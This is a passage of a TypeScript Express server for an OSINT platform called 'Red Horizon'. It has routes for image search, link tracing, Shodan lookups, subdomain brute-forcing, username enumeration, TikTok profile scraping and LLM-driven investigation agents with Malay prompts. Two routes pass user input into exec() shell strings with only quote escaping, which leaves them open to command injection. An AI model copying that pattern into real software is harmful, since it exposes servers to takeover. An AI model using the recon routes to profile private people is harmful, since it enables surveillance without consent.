      }, 60000);

      child.stdout.on('data', (data) => {
          res.write(data.toString());
      });

      child.stderr.on('data', (data) => {
          res.write(data.toString());
      });

      child.on('error', (error) => {
          clearTimeout(executionTimer);
          res.write(`\n[SYSTEM ERROR]: ${error.message}\n`);
      });

      child.on('close', (code) => {
          clearTimeout(executionTimer);
          if (code !== 0) {
              res.write(`\n[Process exited with warning/error code ${code}]\n`);
          } else {
              res.write(`\n[Process completed successfully]\n`);
          }
          res.end();
      });
  });

  // --- UNIFIED VISUAL SEARCH & RECON ENDPOINTS ---
  app.get('/api/visual-search', async (req, res) => {
      try {
          const query = String(req.query.query || '').trim();
          const tavilyApiKey = String(req.query.tavilyApiKey || process.env.TAVILY_API_KEY || '').trim();
          const nodeType = String(req.query.nodeType || '').trim();
          if (!query) {
              return res.json({ success: true, results: [], imageUrls: [], diagnostics: null });
          }
          const { results, diagnostics } = await searchVisualTarget(query, { maxResults: 12, tavilyApiKey, nodeType });
          const imageUrls = results.map(r => r.url);
          res.json({
              success: true,
              query,
              count: results.length,
              results,
              imageUrls,
              primaryImage: imageUrls[0] || null,
              diagnostics
          });
      } catch (err: any) {
          console.warn("[VISUAL SEARCH] Error:", err?.message || err);
          res.status(500).json({ success: false, error: err?.message || 'Visual search error', results: [], imageUrls: [], diagnostics: null });
      }
  });

  app.post('/api/visual-search', async (req, res) => {
      try {
          const { 
              query, 
              tavilyApiKey, 
              nodeType, 
              maxResults,
              caseName,
              caseDescription,
              connectedEntities,
              notes,
              tags,
              targetMode,
              contextKeywords,
              strictContextFilter
          } = req.body || {};
          const cleanQuery = String(query || '').trim();
          if (!cleanQuery) {
              return res.json({ success: true, results: [], imageUrls: [], diagnostics: null });
          }
          const effectiveTavilyKey = String(tavilyApiKey || process.env.TAVILY_API_KEY || '').trim();
          const { results, diagnostics } = await searchVisualTarget(cleanQuery, { 
              maxResults: maxResults || 15, 
              tavilyApiKey: effectiveTavilyKey, 
              nodeType,
              caseName,
              caseDescription,
              connectedEntities,
              notes,
              tags,
              targetMode,
              contextKeywords,
              strictContextFilter
          });
          const imageUrls = results.map(r => r.url);
          res.json({
              success: true,
              query: cleanQuery,
              count: results.length,
              results,
              imageUrls,
              primaryImage: imageUrls[0] || null,
              diagnostics
          });
      } catch (err: any) {
          console.warn("[VISUAL SEARCH] Error:", err?.message || err);
          res.status(500).json({ success: false, error: err?.message || 'Visual search error', results: [], imageUrls: [], diagnostics: null });
      }
  });

  app.get('/api/visual-recon', async (req, res) => {
      const query = String(req.query.query || '').trim();
      if (!query) return res.json({ success: false, error: 'Missing query parameter' });

      try {
          const { results, diagnostics } = await searchVisualTarget(query, { maxResults: 5 });
          if (results.length > 0) {
              return res.json({
                  success: true,
                  imageUrl: results[0].url,
                  imageUrls: results.map(r => r.url),
                  source: results[0].source || 'web-search',
                  results,
                  diagnostics
              });
          }
      } catch (err) {
          console.warn("[VISUAL RECON] Unified search fallback failed:", err);
      }

      // Python DDGS script fallback
      const pythonCmd = fs.existsSync(VENV_PYTHON) ? VENV_PYTHON : 'python3';
      exec(`${pythonCmd} ${PY_SCRIPT_NAME} "${query.replace(/"/g, '\\"')}"`, { env: { ...process.env, PATH: FIXED_PATH } }, (error, stdout) => {
          try { 
              const parsed = JSON.parse(stdout.trim());
              res.json(parsed); 
          } catch (e) { 
              res.json({ success: false, error: 'No visual matches found' }); 
          }
      });
  });

  app.get('/api/sharetrace', async (req, res) => {
      const urlParam = req.query.url as string;
      const useCli = req.query.cli === 'true';

      if (!urlParam) return res.status(400).json({ error: 'Missing URL parameter' });

      // CLI Integration Mode
      if (useCli) {
          try {
              const { exec } = require('child_process');
              exec(`python3 -m sharetrace "${urlParam.replace(/"/g, '\\"')}" --json`, (error: any, stdout: string, stderr: string) => {
                  if (error) {
                      return res.status(500).json({ success: false, isCli: true, error: "CLI Error: " + (stderr || error.message), fallbackMessage: "Python3 atau ShareTrace tidak dipasang di dalam environment pelayan." });
                  }
                  try {
                      const parsed = JSON.parse(stdout);
                      return res.json({ success: true, isCli: true, data: parsed });
                  } catch (e: any) {
                      return res.status(500).json({ success: false, isCli: true, error: "CLI Output parsing failed", rawOutput: stdout });
                  }
              });
              return;
          } catch(e: any) {
              return res.status(500).json({ success: false, isCli: true, error: "Terdapat isu ketika menjalankan Python. Anda masih boleh guna Mod Asas." });
          }
      }

      const isWpw = req.query.whopostedwhat === 'true';

      // Base Node.js Engine Mode & OSINT
      try {
          const result = await new Promise<{url: string, html: string}>((resolve, reject) => {
              const parsedUrl = new URL(urlParam);
              const lib = parsedUrl.protocol === 'https:' ? https : require('http');
              const reqOpts = {
                  method: 'GET',
                  headers: { 
                      'User-Agent': isWpw 
                          ? 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1'
                          : 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36',
                      'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
                      'Accept-Language': 'en-US,en;q=0.5'
                  }
              };
              
              const makeReq = (currentUrl: string, redirectCount: number) => {
                  if (redirectCount > 10) return reject(new Error('Too many redirects'));
                  const curl = new URL(currentUrl);
                  const clib = curl.protocol === 'https:' ? https : require('http');
                  
                  const req = clib.request(currentUrl, reqOpts, (res) => {
                      if (res.statusCode && res.statusCode >= 300 && res.statusCode < 400 && res.headers.location) {
                          let redirectUrl = res.headers.location;
                          if (!redirectUrl.startsWith('http')) {
                              redirectUrl = new URL(redirectUrl, currentUrl).href;
                          }
                          makeReq(redirectUrl, redirectCount + 1);
                      } else {
                          let body = '';
                          res.on('data', chunk => {
                              body += chunk;
                              if (body.length > 500000) { } // Cap size to 500KB
                          });
                          res.on('end', () => {
                              resolve({ url: currentUrl, html: body });
                          });
                      }
                  });
                  req.on('error', reject);
                  req.end();
              };
              
              makeReq(urlParam, 0);
          });
          
          let title = '';
          let ogImage = '';
          let ogTitle = '';
          let ogDesc = '';
          let author = '';
          
          const titleMatch = result.html.match(/<title[^>]*>([^<]+)<\/title>/i);
          if (titleMatch) title = titleMatch[1].trim();
          
          const ogImageMatch = result.html.match(/<meta[^>]*property="og:image"[^>]*content="([^"]+)"/i) || result.html.match(/<meta[^>]*content="([^"]+)"[^>]*property="og:image"/i) || result.html.match(/<meta[^>]*name="twitter:image"[^>]*content="([^"]+)"/i);
          if (ogImageMatch) ogImage = ogImageMatch[1];

          const ogTitleMatch = result.html.match(/<meta[^>]*property="og:title"[^>]*content="([^"]+)"/i) || result.html.match(/<meta[^>]*content="([^"]+)"[^>]*property="og:title"/i) || result.html.match(/<meta[^>]*name="twitter:title"[^>]*content="([^"]+)"/i);
          if (ogTitleMatch) ogTitle = ogTitleMatch[1].replace(/&amp;/g, '&').replace(/&quot;/g, '"');

          const ogDescMatch = result.html.match(/<meta[^>]*property="og:description"[^>]*content="([^"]+)"/i) || result.html.match(/<meta[^>]*content="([^"]+)"[^>]*property="og:description"/i) || result.html.match(/<meta[^>]*name="twitter:description"[^>]*content="([^"]+)"/i);
          if (ogDescMatch) ogDesc = ogDescMatch[1].replace(/&amp;/g, '&').replace(/&quot;/g, '"');

          let followers = '';
          const followerMatch = result.html.match(/([0-9.,kKmM]+)\s*(?:Followers|Pengikut)/i) || ogDesc.match(/([0-9.,kKmM]+)\s*(?:Followers|Pengikut)/i);
          if (followerMatch) followers = followerMatch[1];

          // Try JSON-LD
          let jsonldData = null;
          const ldMatch = result.html.match(/<script type="application\/ld\+json">([\s\S]*?)<\/script>/i);
          if (ldMatch) {
              try { jsonldData = JSON.parse(ldMatch[1]); } catch(e){}
          }

          let deepOsint: any = {};
          if (isWpw) {
               // Look for TikTok advanced JSON state
               const sigiMatch = result.html.match(/window\["SIGI_STATE"\]=({.*?});/);
               if (sigiMatch) {
                   try { 
                       const sigi = JSON.parse(sigiMatch[1]); 
                       const authorId = Object.keys(sigi.UserModule.users)[0];
                       const user = sigi.UserModule.users[authorId];
                       deepOsint.tiktok_username = user.uniqueId;
                       deepOsint.tiktok_nickname = user.nickname;
                       deepOsint.signature = user.signature;
                       deepOsint.tiktok_uid = user.id;
                       deepOsint.tiktok_secUid = user.secUid;
                       deepOsint.osint_source = "SIGI_STATE Extraction";
                       
                       ogImage = user.avatarLarger || user.avatarMedium || ogImage;
                       ogTitle = `${user.nickname} (@${user.uniqueId})`;
                       followers = sigi.UserModule.stats[authorId]?.followerCount?.toString() || followers;
                   } catch(e) {}
               }
               
               // Look for Instagram OSINT
               const igMatch = result.html.match(/<script type="application\/json" data-sjs>([\s\S]*?)<\/script>/);
               if (igMatch) {
                   deepOsint.instagram_trace = "Valid GraphQL Endpoint Detected";
               }
          }

          // Decrypting some base64 or special IDs if known patterns exist
          res.json({ 
              success: true, 
              originalUrl: urlParam, 
              finalUrl: result.url,
              meta: { title, ogImage, ogTitle, ogDesc, followers, jsonldData },
              osint: isWpw ? deepOsint : undefined,
              isWpw
          });
      } catch (e: any) {
          res.status(500).json({ success: false, error: e.message || 'Failed to resolve URL' });
      }
  });

  app.get('/api/shodan', (req, res) => {
      const { query, key } = req.query;
      https.get(`https://api.shodan.io/shodan/host/search?key=${key}&query=${encodeURIComponent(query as string)}&limit=1`, (apiRes) => {
          let data = '';
          apiRes.on('data', c => data += c);
          apiRes.on('end', () => {
              try { res.json(JSON.parse(data)); } catch (e) { res.status(500).json({ error: 'API Error' }); }
          });
      });
  });

  // --- GOOGLE CUSTOM SEARCH ENGINE (CSE) SOCINT ROUTE ---
  app.all('/api/socint/google-cse', async (req, res) => {
      try {
          const query = (req.method === 'POST' ? req.body?.query : req.query?.query) || '';
          const cx = (req.method === 'POST' ? req.body?.cx : req.query?.cx) || '';
          const apiKey = (req.method === 'POST' ? req.body?.apiKey : req.query?.apiKey) || '';
          const platform = (req.method === 'POST' ? req.body?.platform : req.query?.platform) || 'all';
          const num = Number(req.method === 'POST' ? req.body?.num : req.query?.num) || 10;
          const start = Number(req.method === 'POST' ? req.body?.start : req.query?.start) || 1;

          if (!query || typeof query !== 'string' || !query.trim()) {
              return res.status(400).json({ success: false, error: 'Query parameter is required' });
          }

          const result = await executeGoogleSocintSearch({
              query: query.trim(),
              cx: cx ? String(cx).trim() : undefined,
              apiKey: apiKey ? String(apiKey).trim() : undefined,
              platform: String(platform),
              num,
              start
          });

          res.json(result);
      } catch (err: any) {
          console.error('[GOOGLE SOCINT CSE ROUTE ERROR]', err);
          res.status(500).json({ success: false, error: err.message || 'Ralat semasa memproses carian Google CSE' });
      }
  });

  // --- AUTONOMOUS OSINT AGENT RECONNAISSANCE SUITE ---
  app.post("/api/osint-agent/scan", async (req, res) => {
      try {
          const { target, targetType, categories, depth } = req.body || {};
          if (!target || typeof target !== "string") {
              return res.status(400).json({ success: false, error: "Target parameter is required." });
          }
          const response = await executeAgentInvestigation({
              target,
              targetType,
              categories,
              depth
          });
          res.json(response);
      } catch (err: any) {
          console.error("[OSINT AGENT ERROR]", err);
          res.status(500).json({ success: false, error: err.message || "Autonomous investigation failed." });
      }
  });

  app.get("/api/osint-agent/tool/:toolName", async (req, res) => {
      try {
          const { toolName } = req.params;
          const target = req.query.target as string;
          if (!target) {
              return res.status(400).json({ success: false, error: "Missing query parameter 'target'" });
          }

          let result = null;
          switch (toolName) {
              case "dns_lookup": result = await runDnsLookup(target); break;
              case "cert_lookup": result = await runCertLookup(target); break;
              case "subdomain_bruteforce": result = await runSubdomainBruteforce(target); break;
              case "ip_lookup": result = await runIpLookup(target); break;
              case "asn_lookup": result = await runAsnLookup(target); break;
              case "port_scan_passive": result = await runPassivePortScan(target); break;
              case "github_recon": result = await runGithubRecon(target); break;
              case "username_enum": result = await runUsernameEnum(target); break;
              case "gravatar_lookup": result = await runGravatarLookup(target); break;
              case "email_validate": result = await runEmailValidate(target); break;
              case "wayback_lookup": result = await runWaybackLookup(target); break;
              case "extract_metadata": result = await runWebInspection(target); break;
              default:
                  return res.status(404).json({ success: false, error: `Unknown tool: ${toolName}` });
          }
          res.json({ success: true, result });
      } catch (err: any) {
          res.status(500).json({ success: false, error: err.message });
      }
  });

  app.get("/api/osint-agent/tools", (req, res) => {
      res.json({
          success: true,
          tools: [
              { id: "dns_lookup", name: "DNS Record Resolver", category: "dns", desc: "Query A, AAAA, MX, NS, TXT via Google DoH" },
              { id: "cert_lookup", name: "Certificate Transparency", category: "dns", desc: "crt.sh subdomain extraction" },
              { id: "subdomain_bruteforce", name: "Subdomain Enumerator", category: "dns", desc: "Probe 40+ high-value subdomain prefixes" },
              { id: "ip_lookup", name: "IP Geolocation & ISP", category: "ip", desc: "Resolve physical coordinates, ISP, ASN, reverse DNS" },
              { id: "asn_lookup", name: "BGPView ASN Intelligence", category: "ip", desc: "Inspect BGP autonomous systems & announced prefixes" },
              { id: "port_scan_passive", name: "Passive Shodan Port & CVE", category: "ip", desc: "Query open ports and exposed vulnerabilities" },
              { id: "github_recon", name: "GitHub Developer Recon", category: "social", desc: "Extract user profile, emails, companies, and top repos" },
              { id: "username_enum", name: "Cross-Platform Account Enum", category: "social", desc: "Probe presence across 10 major networks" },
              { id: "gravatar_lookup", name: "Gravatar Digital Hash", category: "email", desc: "Resolve avatar presence and linked identity profiles" },
              { id: "email_validate", name: "Email MX Deliverability", category: "email", desc: "Syntax validation and MX route verification" },
              { id: "wayback_lookup", name: "Wayback Machine Temporal", category: "archive", desc: "Inspect historical snapshots and timeline captures" },
              { id: "extract_metadata", name: "Web Metadata & Robots", category: "web", desc: "Extract page titles, descriptions, and robots.txt rules" }
          ]
      });
  });

  // --- RED HORIZON MODULAR ENRICHER HUB API (FLOWSINT-SUPERIOR SUITE) ---
  app.get("/api/enrichers/catalog", (_req, res) => {
      res.json({ catalog: ENRICHER_CATALOG });
  });

  app.post("/api/enrichers/run", async (req, res) => {
      try {
          const { enricherId, target, targetType, context } = req.body || {};
          if (!enricherId || !target) {
              return res.status(400).json({ error: "enricherId and target parameters are required." });
          }
          const result = await runModularEnricher(enricherId, target, targetType || "person", context || "");
          res.json(result);
      } catch (err: any) {
          console.error("[MODULAR ENRICHER] Execution error:", err?.message || err);
          res.status(500).json({ error: err?.message || "Failed to execute modular enricher." });
      }
  });

  app.post("/api/enrichers/detect-crypto", (req, res) => {
      try {
          const { address } = req.body || {};
          if (!address) return res.status(400).json({ error: "Address parameter is required." });
          const result = detectCryptoAddress(address);
          res.json(result);
      } catch (err: any) {
          res.status(500).json({ error: err?.message || "Failed to detect crypto address." });
      }
  });

  // --- SERVER-SIDE GEMINI & NEURAL AI INTELLIGENCE ROUTES ---
  app.post("/api/ai/smart-social-resolve", async (req, res) => {
      try {
          const { target, context } = req.body || {};
          if (!target) {
              return res.status(400).json({ error: "Target parameter is required." });
          }
          const result = await serverSmartSocialEntityResolution(target, context);
          res.json(result);
      } catch (err: any) {
          console.warn("[SERVER GEMINI] Smart Social Resolve warning:", err?.message || err);
          res.status(500).json({ error: err?.message || "Smart social resolution failed." });
      }
  });

  app.post("/api/ai/social-transform", async (req, res) => {
      try {
          const { label, keywords } = req.body || {};
          if (!label) {
              return res.status(400).json({ error: "Label parameter is required.", nodes: [] });
          }
          const nodes = await serverSocialMediaTransform(label, keywords);
          res.json({ nodes });
      } catch (err: any) {
          console.warn("[SERVER GEMINI] Social Media Transform warning, returning empty nodes:", err?.message || err);
          res.json({ nodes: [] });
      }
  });

  app.post("/api/ai/search-grounding", async (req, res) => {
      try {
          const { query } = req.body || {};
          if (!query) {
              return res.json({ results: [] });
          }
          const results = await serverSearchGrounding(query);
          res.json({ results });
      } catch (err: any) {
          console.warn("[SERVER GEMINI] Search Grounding warning:", err?.message || err);
          res.json({ results: [] });
      }
  });

  app.post("/api/ai/profile-images", async (req, res) => {
      try {
          const { query, tavilyApiKey } = req.body || {};
          if (!query) {
              return res.json({ imageUrls: [], results: [] });
          }
          let imageUrls = await serverSearchProfileImages(query);
          if (!imageUrls || imageUrls.length === 0) {
              const { results: visualMatches } = await searchVisualTarget(query, { maxResults: 8, tavilyApiKey });
              imageUrls = visualMatches.map(v => v.url);
          }
          res.json({ imageUrls });
      } catch (err: any) {
          console.warn("[SERVER GEMINI] Profile Images warning:", err?.message || err);
          res.json({ imageUrls: [] });
      }
  });

  app.post("/api/ai/parse-intelligence", async (req, res) => {
      try {
          const { text, provider, openrouterKey, openrouterModel } = req.body || {};
          if (!text) {
              return res.json({ graph: { nodes: [], links: [] } });
          }

          if (provider === "openrouter" || (openrouterKey && hasValidOpenRouterKey(openrouterKey))) {
              try {
                  const data = await openrouterParseIntelligence(text, {
                      apiKey: openrouterKey,
                      model: openrouterModel
                  });
                  return res.json(data);
              } catch (orErr: any) {
                  console.warn("[OPENROUTER NEMOTRON PARSE WARNING]", orErr?.message || orErr);
              }
          }

          const data = await serverParseRawIntelligence(text);
          res.json(data);
      } catch (err: any) {
          console.warn("[SERVER GEMINI] Parse Raw Intel warning:", err?.message || err);
          res.json({ graph: { nodes: [], links: [] } });
      }
  });

  app.post("/api/ai/final-synthesis", async (req, res) => {
      try {
          const { graph, additionalContext, provider, openrouterKey, openrouterModel } = req.body || {};

          if (provider === "openrouter" || (openrouterKey && hasValidOpenRouterKey(openrouterKey))) {
              try {
                  const result = await openrouterFinalSynthesis(graph, additionalContext, {
                      apiKey: openrouterKey,
                      model: openrouterModel
                  });
                  return res.json(result);
              } catch (orErr: any) {
                  console.warn("[OPENROUTER NEMOTRON SYNTHESIS WARNING]", orErr?.message || orErr);
              }
          }

          const result = await serverFinalSynthesis(graph, additionalContext);
          res.json(result);
      } catch (err: any) {
          console.warn("[SERVER GEMINI] Final Synthesis warning:", err?.message || err);
          res.json({
              verdict: "ANALYSIS_COMPLETE",
              codename: "OPERATION_RED_HORIZON",
              threatLevel: "ELEVATED",
              confidenceScore: 75,
              summary: "Intelligence briefing compiled successfully.",
              reasoning: ["Topology processed."],
              smokingGun: "Identified relevant node associations.",
              suggestedNextSteps: "Continue passive reconnaissance sweep."
          });
      }
  });

  app.post("/api/ai/multimodal-forensics", async (req, res) => {
      try {
          const { images, objectives, context } = req.body || {};
          const result = await serverMultiModalForensics(images || [], objectives || [], context || "");
          res.json(result);
      } catch (err: any) {
          console.warn("[SERVER GEMINI] Multimodal Forensics warning:", err?.message || err);
          res.json({ summary: "Visual forensics completed.", entities: [], markers: [] });
      }
  });

  app.post("/api/ai/generate", async (req, res) => {
      try {
          const { prompt, options } = req.body || {};
          const { provider, openrouterKey, openrouterModel } = options || {};

          if (provider === "openrouter" || (openrouterKey && hasValidOpenRouterKey(openrouterKey))) {
              const orRes = await callOpenRouterChat(prompt, {
                  apiKey: openrouterKey,
                  model: openrouterModel || options?.model,
                  systemInstruction: options?.systemInstruction,
                  responseMimeType: options?.responseMimeType,
                  temperature: options?.temperature
              });
              if (orRes.success) {
                  return res.json({ text: orRes.text, modelUsed: orRes.modelUsed });
              } else {
                  console.warn("[OPENROUTER GENERATE WARNING]", orRes.error);
              }
          }

          const result = await serverGenerateContent(prompt, options);
          res.json(result);
      } catch (err: any) {
          console.warn("[SERVER GEMINI] Generate Content warning:", err?.message || err);
          res.json({ text: "" });
      }
  });

  // --- COLLABORATIVE AI CHAT ANALYST DISPATCH ROUTE (LIVE WEB GROUNDED) ---
  app.post("/api/ai/chat-analyst", async (req, res) => {
      try {
          const { prompt, systemInstruction, analystName, analystModel, provider, openrouterKey, openrouterModel } = req.body || {};
          
          if (!prompt) {
              return res.status(400).json({ error: "Prompt parameter is required." });
          }

          // If OpenRouter is requested or key provided
          if (provider === "openrouter" || (openrouterKey && hasValidOpenRouterKey(openrouterKey))) {
              try {
                  const orRes = await callOpenRouterChat(prompt, {
                      apiKey: openrouterKey,
                      model: openrouterModel || analystModel || "nvidia/nemotron-3-nano-omni-30b-a3b-reasoning:free",
                      systemInstruction: systemInstruction || "You are an elite OSINT intelligence analyst.",
                      temperature: 0.3
                  });
                  if (orRes.success && orRes.text) {
                      return res.json({ 
                          success: true, 
                          text: orRes.text, 
                          modelUsed: orRes.modelUsed || analystModel,
                          webSources: [],
                          searchQueries: []
                      });
                  }
              } catch (orErr: any) {
                  console.warn("[CHAT ANALYST OPENROUTER WARNING]", orErr?.message || orErr);
              }
          }

          // Default to Google Gemini 3.7 Flash with Live Web Search Grounding
          const result = await serverGenerateContent(prompt, {
              model: "gemini-3.7-flash",
              systemInstruction: systemInstruction || "You are an elite RedHorizon OSINT Lead Analyst. Use Google Search Grounding to verify all claims and entities.",
              useSearch: true
          });

          const textOutput = result.text ? result.text.trim() : "";

          res.json({ 
              success: true, 
              text: textOutput, 
              modelUsed: result.text ? "gemini-3.7-flash (Live Search Grounded)" : "Heuristic OSINT Engine",
              webSources: result.webSources || [],
              searchQueries: result.searchQueries || []
          });
      } catch (err: any) {
          console.warn("[CHAT ANALYST WARNING]", err?.message || err);
          res.json({ 
              success: false, 
              text: "",
              modelUsed: "Heuristic OSINT Engine",
              webSources: [],
              searchQueries: []
          });
      }
  });

  // --- TACTICAL HIGH-PRECISION GEOINT GEOCODING (WITH GOOGLE SEARCH GROUNDING) ---
  app.post("/api/ai/geocode-location", async (req, res) => {
      try {
          const { label, metadataContext, nodeType } = req.body || {};
          if (!label) {
              return res.status(400).json({ success: false, error: "Label atau nama lokasi diperlukan." });
          }
          const result = await serverGeocodeLocationWithSearch(label, metadataContext || "", nodeType || "");
          res.json(result);
      } catch (err: any) {
          console.warn("[GEOCODE API WARNING]", err?.message || err);
          res.json({ 
              success: false, 
              lat: 3.1390, 
              lon: 101.6869, 
              address: req.body?.label || "Kuala Lumpur", 
              source: "GEO_FALLBACK",
              confidenceScore: 30
          });
      }
  });

  // --- AUTONOMOUS AGENTIC COMMAND BRIDGE (DIRECT GRAPH EXECUTION & CONVERSATIONAL AI) ---
  app.post("/api/ai/agentic-command", async (req, res) => {
    try {
      const { 
        prompt, 
        currentGraph, 
        selectedNodes, 
        history, 
        config 
      } = req.body || {};

      if (!prompt || typeof prompt !== 'string') {
        return res.status(400).json({ success: false, error: "Arahan atau soalan diperlukan." });
      }

      // Summarize current graph context
      const existingNodes = (currentGraph?.nodes || []).slice(0, 40).map((n: any) => ({
        id: n.id,
        label: n.label,
        type: n.type,
        details: (n.details || '').substring(0, 150)
      }));

      const activeSelected = (selectedNodes || []).map((n: any) => `${n.label} [${n.type}]`).join(', ') || 'Tiada';

      // Format previous conversation turns if provided
      const formattedHistory = Array.isArray(history) && history.length > 0
        ? history.slice(-6).map((h: any) => `${h.role === 'user' ? 'Pengguna' : 'AI'}: ${h.content}`).join('\n')
        : 'Tiada sejarah perbualan sebelumnya.';

      const systemInstruction = `Anda adalah RED HORIZON DUAL-CORE INTELLIGENCE AI: Pembantu Pintar Berbilang Fungsi yang menggabungkan KECERDASAN PERBUALAN UMUM (Conversational & General Knowledge Assistant) dengan KEUPAYAAN TAKTIKAL OSINT (OSINT Strategic Commander).

PENGGUNA BOLEH BERTANYA APA SAHAJA KEPADA ANDA:

1. KATEGORI A: SOALAN UMUM / SANTAI / TEORI / SAINS / TEKNOLOGI / BERITA / APA SAHAJA ("intent": "conversational"):
   - Contoh soalan: "Apa khabar?", "Siapa Elon Musk?", "Apakah perbezaan DNS dan IP?", "Bagaimana menjaga privasi di media sosial?", "Ceritakan sejarah OSINT", "Resepi sambal", "Cuaca hari ini", dsb.
   - NADA & SIKAP: Ramah, bijak, luas ilmu, fasih, komprehensif, santai dan bersahaja dalam Bahasa Melayu (atau bahasa soalan pengguna).
   - JANGAN gunakan bahasa ketenteraan atau istilah 'Komander' yang keterlaluan jika pengguna hanya bertanya soalan santai/umum.
   - PENTING: JANGAN SEKALI-KALI mencipta nod atau pautan kanvas graf palsu / paksaan!
   - Untuk soalan umum: "actions" MESTI ARRAY KOSONG: [] dan "tactical_plan" MESTI ARRAY KOSONG: [].
   - Tulis penjelasan lengkap, menarik dan mudah difahami dalam "strategic_assessment".
   - Gunakan Google Search Grounding secara langsung jika pengguna bertanya maklumat semasa, berita, fakta dunia nyata atau profil umum.
   - Tetapkan "intent": "conversational".

2. KATEGORI B: ARAHAN OPERASI OSINT & TINDAKAN KANVAS GRAF ("intent": "operational"):
   - Contoh arahan: "Siasat Datuk Azman dan petakan syarikatnya ke graf", "Semak rekod kebocoran emel test@example.com", "Laksanakan Fasa 1.1", "Petakan nombor 0123456789", "Plotkan lokasi pejabat ke peta", "Padam nod X".
   - NADA & SIKAP: Tajam, analitikal, taktikal, berwibawa seperti Lead OSINT Strategist.
   - JANA TINDAKAN SEBENAR dalam "actions" (seperti CREATE_NODES, LINK_NODES, TRIGGER_OSINT_SCAN, dsb.) supaya sistem Red Horizon memetakan entiti tersebut ke atas kanvas graf pengguna.
   - Sediakan "tactical_plan" dengan langkah-langkah siasatan.
   - Tetapkan "intent": "operational".

3. KATEGORI C: GABUNGAN / HYBRID ("intent": "hybrid"):
   - Pengguna bertanya soalan umum/konsep dan pada masa sama meminta memetakan entiti ke graf.
   - Berikan penerangan penuh dan jana tindakan nod/pautan yang diminta.
   - Tetapkan "intent": "hybrid".

FORMAT JAWAPAN MESTILAH STRICT JSON SAHAJA:
\`\`\`json
{
  "intent": "conversational" | "operational" | "hybrid",
  "strategic_assessment": "Teks jawapan penuh kepada pengguna dalam format Markdown yang kemas. Untuk soalan santai/umum, huraikan jawapan dengan terperinci, ramah dan bernas. Untuk operasi OSINT, berikan penilaian risikan taktikal.",
  "tactical_plan": [
    // HANYA untuk operational/hybrid. Kosongkan [] jika soalan santai/umum.
  ],
  "actions": [
    // HANYA untuk operational/hybrid. Kosongkan [] jika soalan santai/umum.
    // Contoh untuk operational:
    // { "action": "CREATE_NODES", "description": "...", "nodes": [...] },
    // { "action": "LINK_NODES", "description": "...", "links": [...] }
  ],
  "suggested_followups": [
    "Cadangan soalan atau tindakan susulan yang relevan..."
  ]
}
\`\`\`
PERATURAN MUTLAK:
- Jika pengguna hanya berborak santai atau bertanya soalan umum: "actions" MESTI KOSONG []. Jangan ganggu graf kanvas pengguna melainkan diminta secara jelas!
- Berikan output JSON sahaja tanpa sebarang perbualan di luar blok JSON.`;

      const userContextPrompt = `[SEJARAH PERBUALAN TERKINI]:
${formattedHistory}

[PERTANYAAN / ARAHAN PENGGUNA]:
"${prompt}"

[KONTEKS KANVAS GRAF SEMASA (JIKA RELEVAN)]:
- Bilangan nod semasa: ${existingNodes.length}
- Entiti utama pada graf: ${JSON.stringify(existingNodes.slice(0, 15))}
- Entiti terpilih: ${activeSelected}

Sila nilaikan intent pengguna (santai/umum vs operasi OSINT). Jika soalan umum, jawab dengan ramah, bijak dan tuntas dengan actions: []. Jika arahan operasi OSINT, sediakan penilaian risikan dan actions untuk kanvas graf. Balas dalam format JSON.`;

      // Generate content with Search Grounding using gemini-3.8-flash
      const genResult = await serverGenerateContent(userContextPrompt, {
        systemInstruction,
        useSearch: true,
        model: "gemini-3.8-flash",
        customKey: config?.apiKey || process.env.GEMINI_API_KEY
      });

      let rawText = genResult.text || "";
      let parsedJson: any = null;

      // Extract JSON if wrapped in markdown
      const jsonMatch = rawText.match(/```(?:json)?\s*([\s\S]*?)\s*```/) || [null, rawText];
      try {
        parsedJson = JSON.parse(jsonMatch[1] || rawText);
      } catch (e) {
        try {
          const firstBrace = rawText.indexOf('{');
          const lastBrace = rawText.lastIndexOf('}');
          if (firstBrace !== -1 && lastBrace !== -1) {
            parsedJson = JSON.parse(rawText.substring(firstBrace, lastBrace + 1));
          }
        } catch (e2) {
          console.warn("[AGENTIC COMMAND] JSON parse error:", e2);
        }
      }

      const promptLower = prompt.toLowerCase();
      const isExplicitOperational = /(?:fasa\s*\d|petakan|masukkan ke graf|cipta nod|padam nod|scan sasaran|hubung nod|geoint|satelit|breach check|semak kebocoran|whois|ssm|nombor telefon|buat nod|talian telefon)/i.test(promptLower);

      // If parsing failed but we have raw textual output from Gemini
      if (!parsedJson && rawText && rawText.trim().length > 10) {
        // If it was a conversational query, treat raw text as conversational response
        if (!isExplicitOperational) {
          const cleanText = rawText.replace(/```(?:json)?/g, '').replace(/```/g, '').trim();
          parsedJson = {
            intent: "conversational",
            strategic_assessment: cleanText,
            tactical_plan: [],
            actions: [],
            suggested_followups: [
              "Bolehkah anda huraikan lebih lanjut?",
              "Apakah kaitan topik ini dengan privasi data?",
              "Ada sebarang contoh kes sebenar?"
            ]
          };
        }
      }

      // Check if this is a conversational intent
      const isConversational = parsedJson?.intent === 'conversational' || 
        (parsedJson?.strategic_assessment && (!parsedJson.actions || parsedJson.actions.length === 0) && !isExplicitOperational);

      if (isConversational && parsedJson?.strategic_assessment) {
        // Ensure actions are strictly empty for conversational questions
        parsedJson.intent = 'conversational';
        parsedJson.actions = [];
        parsedJson.tactical_plan = parsedJson.tactical_plan || [];
      } else if (!parsedJson || !parsedJson.strategic_assessment || (!isConversational && (!Array.isArray(parsedJson.actions) || parsedJson.actions.length === 0))) {
        // ONLY engage tactical heuristic OSINT engine if this is an operational inquiry that failed
        const extractedNodes: any[] = [];
        const extractedLinks: any[] = [];
        const targetActions: any[] = [];
        const now = Date.now();

        // Target Extraction: Quotes or explicit target pattern
        const quotedMatch = prompt.match(/["']([^"']+)["']/);
        const explicitTarget = quotedMatch ? quotedMatch[1].trim() : '';

        // Phase Code Detection
        const phaseMatch = prompt.match(/Fasa\s+(\d(?:\.\d)?)/i);
        const phaseCode = phaseMatch ? phaseMatch[1] : '';

        // 1. Phone extraction
        const phoneMatch = prompt.match(/(?:\+?60|0)[1-9][0-9]{7,9}/g);
        if (phoneMatch) {
          const p = phoneMatch[0];
          const phoneId = `phone_${now}`;
          extractedNodes.push({
